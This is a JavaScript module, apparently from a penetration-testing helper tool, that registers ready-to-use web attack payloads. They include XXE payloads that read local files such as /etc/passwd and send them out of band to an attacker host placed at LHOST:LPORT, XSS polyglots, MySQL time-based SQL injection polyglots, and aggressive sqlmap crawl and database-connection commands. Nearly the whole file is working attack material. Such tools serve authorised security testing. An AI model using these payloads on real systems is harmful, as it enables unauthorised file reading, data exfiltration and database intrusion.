
var M = require('mstring'),
	ask = require('../modules/questionUser'),
	web = require("../modules/webserver/webserver.js");

// Payload Array
arrayWeb = [];

var Load = function(obj){
	arrayWeb.push(obj);
}

// Question helper method
var questions = [];
var question = function(val){
	questions.push(val);
}

/*
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)

	Ex:

	callback: function(bro){
		question.ask("Do you even ...?") Ask the user something, return value will be entered as PROMPT value
		question.ask(ask.http) Ask user if they want to start a webserver after the payload is printed
	}


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis

	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>


*/


// ########## XXE Attacks ####################

Load({
	title: "Remote DTD File Parsing",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>' >",
	callback: function(bro){
		question(ask.http);
		ask.some(questions, bro);
	},
	category: "XML"
})


Load({
	title: "XXE (Local File Read)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]>&bar;",
	callback: function(bro){
	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
	  question(ask.http);
	  ask.some(questions, bro);
	},
	category: "XML"
})

Load({
	title: "XXE (Local File Read using parameter entities)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/inline\">%dtd; ]><methodCall><methodName>&xxe;</methodName></methodCall>",
	callback: function(bro){
	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
	  question(ask.http);
	  ask.some(questions, bro);
	},
	category: "XML"
})




Load({
	title: "XXE (Out of Band File Exfiltration using parameter entities)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send\">%dtd;%send;]>",
	callback: function(bro){
		question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
		question(ask.http);
		ask.some(questions, bro);
	},
	category: "XML"
})

// ####### XSS ##########

Load({ payload: "'';!--\"<XSS>=&{()}", title: "Test string to see how data is being filtered/escaped.", category: "XSS"})
Load({ payload: "--></ScRiPt>\">'><ImG/src=\"\"/onerror=\"alert(1)\"/>", title: "XSS Polyglot injecting into HTML", category: "XSS"})
Load({ payload: "';alert(1)//\';alert(2)//\";alert(3)//\\\";alert(4)//-->\">'>=&{}", title: "XSS Polyglot injecting into JS", category: "XSS"})

// Credit to https://twitter.com/0xsobky
Load({ payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", title: "XSS polyglot locator", category: "XSS"})



// ####### sqlmap #########

Load({ payload: "SLEEP(<PROMPT>) /*' or SLEEP(<PROMPT>) or '\" or SLEEP(<PROMPT>) or \"*/", title: "SQLi Polyglot", category: "SQLi",
callback: function(bro){
	question("How many seconds would you like to sleep for?");
	ask.some(questions, bro);
}})

// Credit to Detectify https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
Load({ payload: "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/", title: "SQLi (MySQL) Polyglot", category: "SQLi"})


Load({
	title: "Use sqlmap to crawl and scan for SQLi",
	payload: "sqlmap -u '<PROMPT (ex: http://foo.bar)>' --forms --batch --crawl=10 --level=5 --risk=3 --cookie='<PROMPT>'",
	category: "SQLi",
	callback: function(bro){
		question("What URL would you like to scan?");
		question("What cookies would you like to include?");
		ask.some(questions, bro);
	}
})

Load({
	title: "Use sqlmap to directly connect to an Oracle db (requires Oracle instant client)",
	payload: "sqlmap -d 'oracle://<PROMPT (username:password)>@<RHOST>:<RPORT>/<PROMPT (SID)>'",
	category: "SQLi",
	callback: function(bro){
		question("What DB credentials would you like to use? (Enter as username:password)");
		question("Whats the SID of the DB? (ex: testdb)");
		ask.some(questions, bro);
	}
})

Load({
	title: "Use sqlmap to directly connect to a MySQL db",
	payload: "sqlmap -d 'mysql://<PROMPT (username:password)>@<RHOST>:<RPORT>/<PROMPT (dbname)>'",
	category: "SQLi",
	callback: function(bro){
		question("What DB credentials would you like to use? (Enter as username:password)");
		question("Whats the name of the DB? (ex: testdb)");
		ask.some(questions, bro);
	}
})


/*
######################################################
############### End of Payloads ######################
######################################################
*/

module.exports = arrayWeb;
